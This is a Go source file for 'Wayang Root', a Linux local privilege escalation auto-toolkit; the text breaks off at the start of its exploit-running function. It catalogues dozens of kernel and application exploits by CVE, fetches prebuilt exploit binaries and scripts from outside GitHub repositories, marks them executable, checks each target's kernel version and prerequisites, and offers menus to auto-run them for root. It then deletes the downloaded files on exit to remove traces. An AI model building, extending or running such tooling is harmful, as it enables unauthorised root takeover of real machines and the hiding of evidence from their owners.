package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"os/user"
	"path/filepath"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

type KernelRange struct {
	min    string
	max    string
	allKer bool
	notes  string
}

type Exploit struct {
	binary  string
	name    string
	cve     string
	size    string
	kernel  KernelRange
	viable  bool
	matched bool
	// Collection support (all-lpe-collection):
	remote   string     // main file path inside the lpe repo ("" = legacy flat binary)
	deps     []string   // extra repo files to download (payloads, helper bins)
	execCmd  [][]string // argv chains to run in order; empty = [["./"+binary]]
	bgFirst  bool       // run the first execCmd in the background (e.g. fuse daemon)
	requires string     // prerequisites shown in the UI
}

// allFiles returns every local file this exploit needs (main binary + deps).
func (e *Exploit) allFiles() []string {
	main := e.binary
	if e.remote != "" {
		main = e.remote
	}
	files := []string{main}
	files = append(files, e.deps...)
	return files
}

// mainFile returns the primary local file path for this exploit.
func (e *Exploit) mainFile() string {
	if e.remote != "" {
		return e.remote
	}
	return e.binary
}

// runChain returns the argv chains to execute for this exploit.
func (e *Exploit) runChain() [][]string {
	if len(e.execCmd) > 0 {
		return e.execCmd
	}
	return [][]string{{"./" + e.mainFile()}}
}

const (
	maxExploits     = 96
	downloadWorkers = 8
	version         = "4.0-lpe-collection"
	ghRepo          = "https://raw.githubusercontent.com/Wayang1337/lpe-toolkit/main"
	lpeRepo         = "https://raw.githubusercontent.com/shootcannon/all-lpe-collection/main"
)

var (
	exploits        []Exploit
	viableCount     int
	kernelVersion   string
	matchedExploits []int
	httpClient      = &http.Client{Timeout: 300 * time.Second}
	printMu         sync.Mutex
	// downloadedFiles tracks binaries downloaded THIS session so they can be
	// wiped on exit (quit, root obtained, all failed, or Ctrl+C/SIGTERM).
	downloadedMu    sync.Mutex
	downloadedFiles []string
	downloadedDirs  []string
	cleanupDisabled bool
)

// trackDir records a directory created for collection downloads (deduped).
func trackDir(dir string) {
	downloadedMu.Lock()
	for _, d := range downloadedDirs {
		if d == dir {
			downloadedMu.Unlock()
			return
		}
	}
	downloadedDirs = append(downloadedDirs, dir)
	downloadedMu.Unlock()
}

// trackDownloaded records a downloaded binary for session cleanup (deduped,
// so a re-download of the same binary never double-lists it).
func trackDownloaded(name string) {
	downloadedMu.Lock()
	for _, f := range downloadedFiles {
		if f == name {
			downloadedMu.Unlock()
			return
		}
	}
	downloadedFiles = append(downloadedFiles, name)
	downloadedMu.Unlock()
}

// cleanupDownloaded removes every file downloaded this session. Safe to call
// multiple times (idempotent) and from signal handlers.
func cleanupDownloaded() {
	downloadedMu.Lock()
	if cleanupDisabled {
		downloadedMu.Unlock()
		return
	}
	files := make([]string, len(downloadedFiles))
	copy(files, downloadedFiles)
	downloadedFiles = nil
	dirs := make([]string, len(downloadedDirs))
	copy(dirs, downloadedDirs)
	downloadedDirs = nil
	downloadedMu.Unlock()

	if len(files) == 0 && len(dirs) == 0 {
		return
	}
	printMu.Lock()
	fmt.Print("\033[1;36m  [*] Cleaning up downloaded exploit binaries...\033[0m\n")
	printMu.Unlock()
	ok, fail := 0, 0
	for _, f := range files {
		if err := os.Remove(f); err == nil {
			ok++
		} else {
			fail++
			printMu.Lock()
			fmt.Printf("      \033[1;31m[-]\033[0m Failed to delete: %s (%v)\n", f, err)
			printMu.Unlock()
		}
	}
	// Remove now-empty collection dirs, deepest first.
	osok, osfail := 0, 0
	sort.Slice(dirs, func(i, j int) bool { return len(dirs[i]) > len(dirs[j]) })
	for _, d := range dirs {
		if err := os.Remove(d); err == nil {
			osok++
		} else {
			osfail++
		}
	}
	printMu.Lock()
	fmt.Printf("      \033[1;32m[+]\033[0m Cleanup complete: \033[1;37m%d\033[0m deleted", ok)
	if fail > 0 {
		fmt.Printf(" | \033[1;31m%d failed\033[0m", fail)
	}
	if osok > 0 {
		fmt.Printf(" | %d dirs removed", osok)
	}
	fmt.Print("\033[0m\n")
	printMu.Unlock()
	_ = osfail
}

func addExploit(binary, name, cve, size string, kernelMin, kernelMax string, notes string, allKer bool) {
	if len(exploits) >= maxExploits {
		return
	}
	exploits = append(exploits, Exploit{
		binary:  binary,
		name:    name,
		cve:     cve,
		size:    size,
		kernel:  KernelRange{min: kernelMin, max: kernelMax, allKer: allKer, notes: notes},
		viable:  false,
		matched: false,
	})
}

// addCollection registers an exploit from the all-lpe-collection repo.
// mainPath is the repo-relative path of the main binary (may be "" if the
// exploit is a script, in which case use deps to carry its files and set the
// first execCmd entry explicitly).
func addCollection(mainPath, cve, name, kernelMin, kernelMax, requires string, opts ...any) {
	if len(exploits) >= maxExploits {
		return
	}
	e := Exploit{
		binary:   filepath.Base(mainPath),
		name:     name,
		cve:      cve,
		size:     "",
		kernel:   KernelRange{min: kernelMin, max: kernelMax, notes: requires},
		remote:   mainPath,
		requires: requires,
	}
	if strings.HasSuffix(mainPath, ".sh") {
		e.execCmd = [][]string{{"bash", mainPath}}
	} else if strings.HasSuffix(mainPath, ".py") {
		e.execCmd = [][]string{{"python3", mainPath}}
	}
	for _, o := range opts {
		switch v := o.(type) {
		case []string: // deps(...)
			e.deps = append(e.deps, v...)
		case [][]string: // chain(...) or allKer-free exec override
			e.execCmd = v
		case func(*Exploit): // option mutators
			v(&e)
		}
	}
	exploits = append(exploits, e)
}

// deps returns files (repo-relative) that must be downloaded alongside main.
func deps(files ...string) []string { return files }

// chain sets an explicit argv sequence to run for this exploit.
func chain(chains ...[]string) [][]string { return chains }

// bgFirst marks the first chain command to run in the background (daemons).
func bgFirst() func(*Exploit) { return func(e *Exploit) { e.bgFirst = true } }

// requires sets the prerequisites hint text (unused positional, kept for
// readability at the call site).
func requires(text string) func(*Exploit) { return func(e *Exploit) { e.requires = text } }

// allKer flags an exploit as kernel-version-independent (app-level).
func allKer() func(*Exploit) { return func(e *Exploit) { e.kernel.allKer = true } }

func initExploits() {
	addExploit("dirty-pedit-static", "Dirty Pedit", "CVE-2026-46331", "747KB", "5.18", "7.1-rc7", "", false)
	addExploit("packet-edit-meme-static", "PACKET_EDIT_MEME", "CVE-2026-46331", "755KB", "5.18", "7.1", "", false)
	addExploit("fragnesia-static", "Fragnesia", "CVE-2026-46300", "731KB", "5.0", "7.9", "", false)
	addExploit("fragnesia2-static", "Fragnesia v2", "Enhanced version", "827KB", "5.0", "7.9", "", false)
	addExploit("cifswitch-static", "CIFSwitch", "CVE-2026-46243", "1.0MB", "5.0", "7.9", "", false)
	addExploit("bad-epoll-static", "Bad Epoll", "CVE-2026-46242", "1015KB", "6.12", "6.12.67", "LTS", false)
	addExploit("skb-shift-static", "skb_shift", "CVE-2026-43503", "747KB", "3.9", "7.1-rc5", "", false)
	addExploit("gro-flag-loss-static", "GRO Flag Loss", "CVE-2026-43503", "747KB", "3.9", "7.1-rc5", "", false)
	addExploit("dirtyclone-static", "DirtyClone", "CVE-2026-43503", "1023KB", "7.1-rc1", "7.1-rc4", "", false)
	addExploit("dirtyfrag-static", "DirtyFrag", "CVE-2026-43284", "877KB", "5.0", "7.9", "", false)
	addExploit("pack2theroot-static", "Pack2TheRoot", "CVE-2026-41651", "789KB", "0.0", "9.9", "All (PackageKit)", true)
	addExploit("fuse-oob-static", "FUSE OOB", "CVE-2026-31694", "31KB", "6.15", "7.9", "", false)
	addExploit("dirtydecrypt-static", "DirtyDecrypt", "CVE-2026-31635", "838KB", "5.0", "7.9", "", false)
	addExploit("copyfail-go-static", "CopyFail", "CVE-2026-31431", "2.1MB", "5.0", "7.9", "", false)
	addExploit("ipv6-frag-escape-static", "IPv6 Frag Escape", "6.12.x container escape", "855KB", "6.12.0", "6.12.99", "", false)
	addExploit("pintheft-static", "PinTheft", "Page cache exploit", "834KB", "5.0", "7.9", "", false)
	addExploit("nft-uaf-static", "nft UAF", "CVE-2024-1086", "980KB", "5.0", "6.9", "", false)
	addExploit("ovfs-fuse-static", "OvFS+FUSE", "CVE-2023-0386", "826KB", "5.11", "7.9", "", false)
	addExploit("nft-uaf2-static", "nft UAF2", "CVE-2022-2586", "1.1MB", "5.0", "5.18", "", false)
	addExploit("dirtypipe-static", "DirtyPipe", "CVE-2022-0847", "806KB", "5.8", "5.16.11", "", false)
	addExploit("pwnkit-static", "PwnKit", "CVE-2021-4034", "779KB", "0.0", "9.9", "All (pkexec)", true)
	addExploit("polkit-dbus-static", "Polkit D-Bus", "CVE-2021-3560", "830KB", "0.0", "9.9", "All (polkit)", true)
	addExploit("overlayfs-static", "OverlayFS", "CVE-2021-3493", "826KB", "3.0", "5.11", "", false)
	addExploit("netfilter-oob-static", "netfilter OOB", "CVE-2021-22555", "811KB", "2.6.32", "5.11", "", false)
	addExploit("pidfd-race-static", "pidfd-race", "CVE-2026-46333", "923KB", "5.0", "7.9", "", false)
	addExploit("docker-sock-static", "Docker Socket", "Docker escape", "821KB", "0.0", "9.9", "Container", true)
	addExploit("debian11-xpl2026", "Debian11 XPL 2026", "2026 exploit collection", "28KB", "0.0", "9.9", "Kernel range unverified", false)
	addExploit("proc_readdir_de", "Proc Readdir", "procfs readdir exploit", "1.1MB", "0.0", "9.9", "Kernel range unverified", false)

	// ---------- all-lpe-collection (github.com/shootcannon/all-lpe-collection) ----------
	// Kernel exploits. Paths point at prebuilt x86_64 ELF binaries in the repo.
	addCollection("CVE-2016-0728/cve-2016-0728", "CVE-2016-0728", "Keyring GC UAF", "3.8", "4.3", "")
	addCollection("CVE-2016-2384/poc.bin", "CVE-2016-2384", "snd-usbmidi USB", "0.0", "4.5", "physical USB + crafted MIDI device")
	addCollection("CVE-2016-4997/decr", "CVE-2016-4997", "netfilter off-by-one", "4.4", "4.5", "run decr first, then pwn (hardcoded Ubuntu 16.04 symbols)",
		deps("CVE-2016-4997/pwn"), chain([]string{"./CVE-2016-4997/decr"}, []string{"./CVE-2016-4997/pwn"}))
	addCollection("CVE-2016-5195/exp-1/dirty", "CVE-2016-5195", "Dirty Cow (pokemon)", "2.6.22", "4.8.3", "race; creates user 'firefart'",
		deps("CVE-2016-5195/exp-2/40611"))
	addCollection("CVE-2016-8655/chocobo_root.bin", "CVE-2016-8655", "AF_PACKET race", "4.4", "4.9", "KASLR+SMEP bypass; no SMAP")
	addCollection("CVE-2016-9793/cve-2016-9793.bin", "CVE-2016-9793", "SO_BUSY_POLL BPF", "0.0", "4.9", "unprivileged userns era kernels")
	addCollection("CVE-2017-1000112/poc.bin", "CVE-2017-1000112", "UFO check", "0.0", "4.13", "")
	addCollection("CVE-2017-1000253/42887", "CVE-2017-1000253", "stack expand down (PIE)", "3.10", "4.13", "CentOS/RHEL 7; embeds rootshell payload")
	addCollection("CVE-2017-11176/exp-slab-4119", "CVE-2017-11176", "POSIX mq_notify UAF", "4.9", "4.11", "needs -no-pie build; target 4.10.7")
	addCollection("CVE-2017-16939/cve-2017-16939", "CVE-2017-16939", "XFRM netlink UAF", "4.4", "4.13", "")
	addCollection("CVE-2017-16995/upstream44.bin", "CVE-2017-16995", "eBPF 32-bit ALU", "4.4", "4.14", "very reliable on 4.4-4.10")
	addCollection("CVE-2017-5123/43029.bin", "CVE-2017-5123", "waitid infoleek", "4.14", "4.14", "")
	addCollection("CVE-2017-6074/poc.bin", "CVE-2017-6074", "DCCP UAF", "2.6.18", "4.9", "SMEP/SMAP bypass semi-reliable",
		deps("CVE-2017-6074/trigger.bin"))
	addCollection("CVE-2017-7308/poc.bin", "CVE-2017-7308", "AF_PACKET TPACKET_V3", "3.2", "4.10", "needs CAP_NET_RAW in userns")
	addCollection("CVE-2017-8890/exp-ret2usr", "CVE-2017-8890", "Phoenix Talon (ret2usr)", "4.5", "4.11", "Ubuntu 17.04 4.10",
		deps("CVE-2017-8890/exp-smep"))
	addCollection("CVE-2018-5333/exec.bin", "CVE-2018-5333", "RDS rds_atomic_free_op", "4.4", "4.14", "requires rds.ko loaded")
	addCollection("CVE-2018-1000001/RationalLove", "CVE-2018-1000001", "glibc ld.so", "2.6", "4.15", "glibc < 2.26; needs userns")
	addCollection("CVE-2018-17182/vma_test.bin", "CVE-2018-17182", "VMA cache UAF", "3.16", "4.18", "1h runtime; run vma_test first",
		deps("CVE-2018-17182/vmacache/puppeteer", "CVE-2018-17182/vmacache/puppet", "CVE-2018-17182/vmacache/suidhelper"))
	addCollection("CVE-2018-18955/subuid_shell.bin", "CVE-2018-18955", "userns map_write", "4.15", "4.19", "needs subuid/gid mapping",
		deps("CVE-2018-18955/subshell.bin", "CVE-2018-18955/rootshell.bin"))
	addCollection("CVE-2019-13272/poc.bin", "CVE-2019-13272", "PTRACE_TRACEME", "4.10", "5.1", "needs active PolKit agent; yama.ptrace_scope<2")
	addCollection("CVE-2021-22555/exp.bin", "CVE-2021-22555", "netfilter x_tables OOB", "2.6.19", "5.12", "KASLR+SMEP+SMAP bypass; needs userns")
	addCollection("CVE-2021-31440/CVE-2021-31440.bin", "CVE-2021-31440", "eBPF verifier (Pwn2Own)", "5.7", "5.11", "",
		deps("CVE-2021-31440/CVE-2021-31440_2.bin"))
	addCollection("CVE-2021-3490/bin/exploit.bin", "CVE-2021-3490", "eBPF alu32 bounds", "5.8", "5.11", "exit root shell cleanly or panic")
	addCollection("CVE-2021-3493/exploit.bin", "CVE-2021-3493", "overlayfs (Ubuntu-only)", "5.4", "5.11", "Ubuntu 20.04/20.10/21.04")
	addCollection("CVE-2021-4154/exp", "CVE-2021-4154", "file userns refcount", "4.13", "5.14", "2 variants",
		deps("CVE-2021-4154/kctf_exp"))
	addCollection("CVE-2021-42008/6pack_exploit.bin", "CVE-2021-42008", "6pack SLIP OOB", "5.10", "5.14", "needs 6pack module + CAP_NET_ADMIN in userns",
		deps("CVE-2021-42008/exploit"))
	addCollection("CVE-2021-43267/blasty-vs-tipc.bin", "CVE-2021-43267", "TIPC heap overflow", "5.10", "5.15", "requires tipc module (autoload)")
	addCollection("CVE-2022-2586/exp", "CVE-2022-2586", "nf_tables nft_object UAF", "5.9", "5.19", "userns + nf_tables")
	addCollection("CVE-2023-0386/exp", "CVE-2023-0386", "overlayfs copy_up", "5.11", "6.2", "chain: fuse daemon first, then exp",
		deps("CVE-2023-0386/fuse", "CVE-2023-0386/getshell.bin"),
		chain([]string{"./CVE-2023-0386/fuse", "./CVE-2023-0386/ovlcap/lower", "./gc"}, []string{"./CVE-2023-0386/exp"}),
		bgFirst(), requires("fuse daemon must run before exp"))
	addCollection("CVE-2024-1086/exploit", "CVE-2024-1086", "nf_tables use-after-free", "5.14", "6.6", "userns; no INIT_ON_ALLOC; panic after success")
	addCollection("CVE-2026-31431/exploit.bin", "CVE-2026-31431", "Copy Fail (AF_ALG+splice)", "2017", "7.0", "4-byte page-cache write; container escape")
	addCollection("CVE-2026-43500/poc.bin", "CVE-2026-43500", "Dirty Frag (RxRPC)", "6.6", "7.0", "needs rxrpc.ko; chain with 43284")
	// App-level exploits (kernel version irrelevant; allKer = true).
	addCollection("CVE-2016-1531/cve-2016-1531.sh", "CVE-2016-1531", "Exim < 4.86.2", "0.0", "9.9", "bash script; exim env expansion", allKer())
	addCollection("CVE-2016-6662/mysql_hookandroot", "CVE-2016-6662", "MySQL/MariaDB", "0.0", "9.9", "needs DB user access",
		deps("CVE-2016-6662/mysql_hookandroot_lib.so", "CVE-2016-6662/0ldSQL_MySQL_RCE_exploit.py"), allKer())
	addCollection("CVE-2017-7494/42060.py", "CVE-2017-7494", "Samba load module", "0.0", "9.9", "python; remote RCE via SMB", allKer())
	addCollection("CVE-2018-14665/openbsd-0day-cve-2018-14665.sh", "CVE-2018-14665", "X.Org server", "0.0", "9.9", "bash; -modulepath/-logfile abuse", allKer())
	addCollection("CVE-2019-10149/exploit.py", "CVE-2019-10149", "Exim 4.87-4.91", "0.0", "9.9", "python; remote RCE via recipient", allKer())
	addCollection("CVE-2021-3156/exploit", "CVE-2021-3156", "sudo Baron Samedit", "0.0", "9.9", "keep libnss_x/x.so.2 next to binary",
		deps("CVE-2021-3156/libnss_x/x.so.2"), allKer())
	addCollection("CVE-2021-4034/PwnKit", "CVE-2021-4034", "polkit pkexec (PwnKit)", "0.0", "9.9", "self-contained shared-object payload", allKer())
	addCollection("CVE-2025-32463/sudo-chwood.sh", "CVE-2025-32463", "sudo chroot", "0.0", "9.9", "bash; sudo 1.9.14-1.9.17p1", allKer())
}

func parseKernelVersion(version string) []int {
	parts := strings.Split(version, ".")
	var nums []int
	for _, p := range parts {
		numStr := ""
		for _, c := range p {
			if c >= '0' && c <= '9' {
				numStr += string(c)
			} else {
				break
			}
		}
		if numStr != "" {
			if n, err := strconv.Atoi(numStr); err == nil {
				nums = append(nums, n)
			}
		}
	}
	return nums
}

func compareKernelVersion(v1, v2 string) int {
	nums1 := parseKernelVersion(v1)
	nums2 := parseKernelVersion(v2)
	maxLen := len(nums1)
	if len(nums2) > maxLen {
		maxLen = len(nums2)
	}
	for i := 0; i < maxLen; i++ {
		n1 := 0
		n2 := 0
		if i < len(nums1) {
			n1 = nums1[i]
		}
		if i < len(nums2) {
			n2 = nums2[i]
		}
		if n1 < n2 {
			return -1
		}
		if n1 > n2 {
			return 1
		}
	}
	return 0
}

// mapArch converts Go's GOARCH naming to the uname-style architecture name.
func mapArch(a string) string {
	switch a {
	case "amd64":
		return "x86_64"
	case "arm64":
		return "aarch64"
	case "386":
		return "i386/i686"
	case "arm":
		return "armv7"
	default:
		return a
	}
}

// getSysInfo is cross-platform: on Linux it reads /proc/sys/kernel/osrelease
// (no cgo, no external deps); on Windows it reports the host OS. The exploit
// binaries themselves are Linux ELF binaries - the toolkit just needs to
// build and run everywhere.
func getSysInfo() (sysname, release, machine string) {
	machine = mapArch(runtime.GOARCH)
	if runtime.GOOS == "windows" {
		return "Windows", "n/a (host OS)", machine
	}
	if b, err := os.ReadFile("/proc/sys/kernel/osrelease"); err == nil {
		return "Linux", strings.TrimSpace(string(b)), machine
	}
	if out, err := exec.Command("uname", "-r").Output(); err == nil {
		return "Linux", strings.TrimSpace(string(out)), machine
	}
	return "Linux", "unknown", machine
}

func isRoot() bool {
	if runtime.GOOS == "windows" {
		return false
	}
	return os.Geteuid() == 0 && os.Getuid() == 0
}

func isKernelInRange(kernelVer string, kr KernelRange) bool {
	if kr.allKer {
		return true
	}
	normalized := kernelVer
	if idx := strings.IndexAny(normalized, "-"); idx != -1 {
		normalized = normalized[:idx]
	}
	cmpMin := compareKernelVersion(normalized, kr.min)
	cmpMax := compareKernelVersion(normalized, kr.max)
	return (cmpMin >= 0) && (cmpMax <= 0)
}

func downloadExploit(binary string) bool {
	printMu.Lock()
	fmt.Printf("      Downloading: %s\n", binary)
	printMu.Unlock()
	url := fmt.Sprintf("%s/%s", ghRepo, binary)
	if strings.Contains(binary, "/") {
		// Collection file: "<CVE-dir>/<path>" lives in the lpe repo.
		url = fmt.Sprintf("%s/%s", lpeRepo, binary)
	}
	resp, err := httpClient.Get(url)
	if err != nil {
		fmt.Printf("      \033[1;31m[-]\033[0m Failed to download: %v\n", err)
		return false
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		printMu.Lock()
		fmt.Printf("      \033[1;31m[-]\033[0m HTTP %d (%s)\n", resp.StatusCode, binary)
		printMu.Unlock()
		return false
	}
	file, err := os.Create(binary)
	if err != nil {
		printMu.Lock()
		fmt.Printf("      \033[1;31m[-]\033[0m Failed to create file: %v (%s)\n", err, binary)
		printMu.Unlock()
		return false
	}
	// Track the moment the file exists on disk: even a partial/failed download
	// must be wiped on exit, not just fully completed ones.
	trackDownloaded(binary)
	defer file.Close()
	_, err = file.ReadFrom(resp.Body)
	if err != nil {
		printMu.Lock()
		fmt.Printf("      \033[1;31m[-]\033[0m Failed to write file: %v (%s)\n", err, binary)
		printMu.Unlock()
		return false
	}
	// chmod is best-effort: it is essential on Linux, a no-op-ish call on Windows.
	if err := os.Chmod(binary, 0755); err != nil && runtime.GOOS != "windows" {
		printMu.Lock()
		fmt.Printf("      \033[1;33m[!]\033[0m chmod failed: %v\n", err)
		printMu.Unlock()
	}
	printMu.Lock()
	fmt.Printf("      \033[1;32m[+]\033[0m Downloaded: %s\n", binary)
	printMu.Unlock()
	return true
}

func autoDownloadMissing() {
	fmt.Print("\033[1;36m  [*] Checking for missing exploits...\033[0m\n")
	missing := []string{}
	seen := map[string]bool{}
	for _, e := range exploits {
		for _, f := range e.allFiles() {
			if !seen[f] && !fileExists(f) {
				seen[f] = true
				missing = append(missing, f)
			}
		}
	}
	if len(missing) == 0 {
		fmt.Print("      \033[1;32m[+]\033[0m All exploits present\n\n")
		return
	}
	// Ensure parent dirs exist for collection files (CVE-xxxx/CVE-xxxx/...).
	for _, f := range missing {
		if strings.Contains(f, "/") {
			dir := filepath.Dir(f)
			os.MkdirAll(dir, 0755)
			// Track every ancestor dir so cleanup can remove them all.
			for d := dir; d != "." && d != "/" && d != ""; d = filepath.Dir(d) {
				trackDir(d)
			}
		}
	}
	fmt.Printf("      Found %d missing files - auto-downloading all (%d workers)...\n", len(missing), downloadWorkers)
	// Parallel download: worker pool keeps bandwidth saturated while capping
	// concurrent connections. Results are counted atomically via the mutex.
	var mu sync.Mutex
	ok, fail := 0, 0
	jobs := make(chan string)
	var wg sync.WaitGroup

	for w := 0; w < downloadWorkers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for bin := range jobs {
				if downloadExploit(bin) {
					mu.Lock()
					ok++
					mu.Unlock()
				} else {
					mu.Lock()
					fail++
					mu.Unlock()
				}
			}
		}()
	}
	for _, bin := range missing {
		jobs <- bin
	}
	close(jobs)
	wg.Wait()

	printMu.Lock()
	fmt.Printf("      \033[1;32m[+]\033[0m Downloaded: \033[1;37m%d\033[0m", ok)
	if fail > 0 {
		fmt.Printf(" | \033[1;31mFailed: %d\033[0m", fail)
	}
	fmt.Print("\033[0m\n\n")
	printMu.Unlock()
}

func fileExists(path string) bool {
	_, err := os.Stat(path)
	return err == nil
}

func checkViable(binary string) bool {
	if !fileExists(binary) {
		return false
	}
	if strings.Contains(binary, "cifswitch") {
		if !fileExists("/usr/sbin/cifs.upcall") && !fileExists("/sbin/cifs.upcall") {
			return false
		}
	}
	if strings.Contains(binary, "docker-sock") {
		// was: unix.Access(W_OK) - replaced with a portable existence check.
		if !fileExists("/var/run/docker.sock") {
			return false
		}
	}
	if strings.Contains(binary, "pwnkit") {
		if !fileExists("/usr/bin/pkexec") {
			return false
		}
	}
	if strings.Contains(binary, "polkit-dbus") {
		if _, err := exec.LookPath("dbus-send"); err != nil {
			return false
		}
	}
	if strings.Contains(binary, "pack2theroot") {
		if _, err := exec.LookPath("dbus-send"); err != nil {
			return false
		}
		if !fileExists("/usr/bin/pkcon") && !fileExists("/usr/sbin/packagekitd") {
			return false
		}
	}
	if strings.Contains(binary, "fuse-oob") {
		if !fileExists("/usr/bin/fusermount3") && !fileExists("/bin/fusermount3") {
			return false
		}
	}
	// Collection exploits that need kernel modules loaded.
	if strings.Contains(binary, "CVE-2018-5333") {
		if !kernelModuleLoaded("rds") {
			return false
		}
	}
	if strings.Contains(binary, "CVE-2021-43267") {
		if !kernelModuleLoaded("tipc") {
			return false
		}
	}
	if strings.Contains(binary, "CVE-2021-42008") {
		if !kernelModuleLoaded("6pack") {
			return false
		}
	}
	if strings.Contains(binary, "CVE-2026-43500") || strings.Contains(binary, "CVE-2026-43284") {
		if !kernelModuleLoaded("rxrpc") {
			return false
		}
	}
	// Collection exploits that need unprivileged user namespaces.
	if strings.Contains(binary, "CVE-2021-22555") || strings.Contains(binary, "CVE-2022-2586") ||
		strings.Contains(binary, "CVE-2024-1086") || strings.Contains(binary, "CVE-2016-9793") ||
		strings.Contains(binary, "CVE-2018-18955") || strings.Contains(binary, "CVE-2026-43284") {
		if !usernsEnabled() {
			return false
		}
	}
	return true
}

// kernelModuleLoaded checks /proc/modules for a given module name.
func kernelModuleLoaded(name string) bool {
	b, err := os.ReadFile("/proc/modules")
	if err != nil {
		return false
	}
	for _, line := range strings.Split(string(b), "\n") {
		if strings.HasPrefix(line, name+" ") {
			return true
		}
	}
	return false
}

// usernsEnabled verifies unprivileged user namespaces are usable by writing a
// "0 0 1" map for the current uid into a new user namespace via unshare(2).
// Cheap static check: read the sysctl knobs and /proc/sys/kernel settings.
func usernsEnabled() bool {
	if runtime.GOOS != "linux" {
		return true // on Windows this is only ever simulated
	}
	for _, p := range []string{
		"/proc/sys/user/max_user_namespaces",
		"/proc/sys/kernel/unprivileged_userns_clone",
	} {
		if b, err := os.ReadFile(p); err == nil {
			v := strings.TrimSpace(string(b))
			if v == "0" {
				return false
			}
		}
	}
	return true
}

func clearScreen() {
	if runtime.GOOS == "windows" {
		exec.Command("cmd", "/c", "cls").Run()
	} else {
		exec.Command("clear").Run()
	}
}

// uiWidth is the standard content width for the banner and section rules.
const uiWidth = 62

// section prints a cyan section rule: "  -- TITLE ------------...". Plain
// text markers only: no emoji, no dingbats.
func section(title string) {
	pad := uiWidth - len(title) - 5
	if pad < 0 {
		pad = 0
	}
	fmt.Printf("\n\033[1;36m  -- %s %s\033[0m\n", title, strings.Repeat("-", pad))
}

// bannerBox prints fixed-width boxed rows used by the tool banner.
func bannerBox(rows []string) {
	top := "  +" + strings.Repeat("-", uiWidth-4) + "+"
	fmt.Printf("\033[1;36m%s\033[0m\n", top)
	for _, r := range rows {
		fmt.Printf("\033[1;36m  | \033[0m\033[1;37m%-*s\033[0m\033[1;36m |\033[0m\n", uiWidth-6, r)
	}
	fmt.Printf("\033[1;36m%s\033[0m\n", top)
}

func printHeader() {
	bannerBox([]string{
		"W A Y A N G   R O O T",
		"Linux Local Privilege Escalation Auto-Toolkit",
		"version: " + version,
		"source : github.com/Wayang1337/lpe-toolkit",
	})
	fmt.Println()
}

func printSystemInfo() {
	sysname, release, machine := getSysInfo()
	kernelVersion = release

	username := "unknown"
	u, err := user.Current()
	if err == nil {
		username = u.Username
	}

	rootStatus := "\033[1;31m[-] no\033[0m"
	if isRoot() {
		rootStatus = "\033[1;32m[+] yes (uid 0)\033[0m"
	}

	section("SYSTEM INFO")
	fmt.Printf("      %-13s\033[1;37m%s\033[0m\n", "OS:", sysname+" ("+runtime.GOOS+")")
	fmt.Printf("      %-13s\033[1;37m%s\033[0m\n", "Kernel:", release)
	fmt.Printf("      %-13s\033[1;37m%s\033[0m\n", "Arch:", machine)
	fmt.Printf("      %-13s\033[1;37m%s\033[0m\n", "User:", username)
	fmt.Printf("      %-13s%s\n\n", "Root access:", rootStatus)
}

func analyzeExploits() {
	fmt.Print("\033[1;36m  [*] Initializing toolkit...\033[0m\n")
	autoDownloadMissing()

	fmt.Print("\033[1;36m  [*] Setting permissions for exploit binaries...\033[0m\n")
	for i := range exploits {
		for _, f := range exploits[i].allFiles() {
			if fileExists(f) {
				if err := os.Chmod(f, 0755); err == nil && runtime.GOOS != "windows" {
					fmt.Printf("      \033[1;32m[+]\033[0m chmod +x %s\n", f)
				}
			}
		}
	}
	fmt.Println()

	fmt.Print("\033[1;36m  [*] Analyzing vulnerabilities...\033[0m\n\n")

	matchedExploits = []int{}
	viableCount = 0
	for i := range exploits {
		exploits[i].viable = checkViable(exploits[i].remote)
		exploits[i].matched = isKernelInRange(kernelVersion, exploits[i].kernel)
		if exploits[i].matched && exploits[i].viable {
			matchedExploits = append(matchedExploits, i)
			viableCount++
		}
	}

	section("KERNEL-MATCHED EXPLOITS (RECOMMENDED)")

	if viableCount > 0 {
		for _, idx := range matchedExploits {
			e := exploits[idx]
			fmt.Printf("  \033[1;32m[+]\033[0m [%d] %s (%s) \033[1;32m[KERNEL MATCH]\033[0m\n",
				idx+1, e.name, e.cve)
			fmt.Printf("        Kernel Range: %s - %s | Size: %s\n", e.kernel.min, e.kernel.max, e.size)
			if e.kernel.notes != "" {
				fmt.Printf("        Notes: %s\n", e.kernel.notes)
			}
		}
	} else {
		fmt.Print("  \033[1;33m[!] No exploits match your kernel version\033[0m\n")
	}

	section("ALL AVAILABLE EXPLOITS")

	totalViable := 0
	for i := range exploits {
		if exploits[i].viable {
			totalViable++
		}
		marker := "  "
		if exploits[i].matched {
			marker = "\033[1;32m*\033[0m"
		}
		if exploits[i].viable {
			fmt.Printf("  %s [%2d] \033[1;32m[+]\033[0m %-24s %s\n", marker, i+1, exploits[i].name, exploits[i].cve)
		} else if !fileExists(exploits[i].mainFile()) {
			fmt.Printf("  %s [%2d] \033[1;31m[-]\033[0m %-24s %s \033[1;31m[Binary not found]\033[0m\n",
				marker, i+1, exploits[i].name, exploits[i].cve)
		} else {
			fmt.Printf("  %s [%2d] \033[1;31m[-]\033[0m %-24s %s \033[1;33m[Requirements not met]\033[0m\n",
				marker, i+1, exploits[i].name, exploits[i].cve)
		}
	}

	fmt.Printf("\n  \033[1;36m[*]\033[0m Found \033[1;32m%d\033[0m total viable exploits\n", totalViable)
	fmt.Printf("  \033[1;36m[*]\033[0m Kernel-matched: \033[1;32m%d\033[0m (* = kernel match)\n\n", viableCount)
}

func showMenu() {
	section("OPTIONS")

	if viableCount > 0 {
		fmt.Printf("   \033[1;32m[0]\033[0m  Auto-run kernel-matched exploits (recommended)\n")
		fmt.Printf("   \033[1;36m[1]\033[0m  Auto-run ALL viable exploits\n")
		fmt.Printf("   \033[1;36m[2-%d]\033[0m  Select specific exploit number\n", len(exploits)+1)
	} else {
		fmt.Printf("   \033[1;32m[0]\033[0m  Auto-run all viable exploits (recommended)\n")
		fmt.Printf("   \033[1;36m[1-%d]\033[0m  Select specific exploit number\n", len(exploits))
	}

	fmt.Printf("   \033[1;33m[99]\033[0m  Show detailed info about each exploit\n")
	fmt.Printf("   \033[1;31m[00]\033[0m  Quit\n")
	fmt.Printf("   \033[1;35m[D]\033[0m   Download missing exploits\n\n")
}

func runExploit(idx int) int {
	if idx < 0 || idx >= len(exploits) {
		return -1
	}
	e := exploits[idx]
